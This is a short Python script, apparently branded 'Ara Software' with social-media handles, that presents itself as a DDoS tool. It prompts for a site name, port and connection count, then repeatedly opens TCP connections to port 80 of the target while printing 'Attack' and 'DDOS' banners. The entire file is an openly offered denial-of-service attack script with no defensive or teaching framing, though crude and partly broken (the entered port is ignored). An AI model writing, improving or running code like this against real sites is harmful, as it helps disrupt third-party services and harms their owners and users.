 
def hack():
    import time
    import socket
    import os
    import sys
    import string
    
    #~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~#
    def restart_program():
        python = sys.executable
        os.execl(python, python, * sys.argv)
    curdir = os.getcwd()
    #~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~#

    logo = """

    #
    # #   #####    ##
    #   #  #    #  #  #
    #     # #    # #    #
    ####### #####  ######
    #     # #   #  #    #
    #     # #    # #    #  Software ...
    =============================
    = Insta:- ara_software      =
    =============================
    = Snap:-  ara_software      =
    =============================
    = YT:-    Ara Software      =
    =============================
    = Tweet:- AraSoftwaree      =
    =============================
    = Tele:-  AraSoftwaree      =
    =============================

    """
    print (logo)
    print("==========================================")
    host=input("Site Name: ")
    print("=========================================")
    port=input( "Port:" )
    print ("==========================================")
    conn=input( "CHAND DDOS: ")
    intconn = int(conn)
    print ("==========================================")
    ip = socket.gethostbyname(host)
    print ("[" + ip + "]")
    print ( "[Ip Locka]")
    print ( "[Attack " + host + "]")
    print ("+----------------------------+")
    def dos():
        #pid = os.fork()
        ddos = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        try:
            ddos.connect((host, 80))
        
            
        except socket.error as msg:
            print("|[Connection Failed]         |")
        print ( "|[DDOS ROSHT !!!!! ]       |")
        ddos.close()
    for i in range(1, intconn):
        dos()
    print ("+----------------------------+")
    print("= AW ZHMARA DDOSAY DAWAT KRDBU TAWAW BU ")
    print (logo)




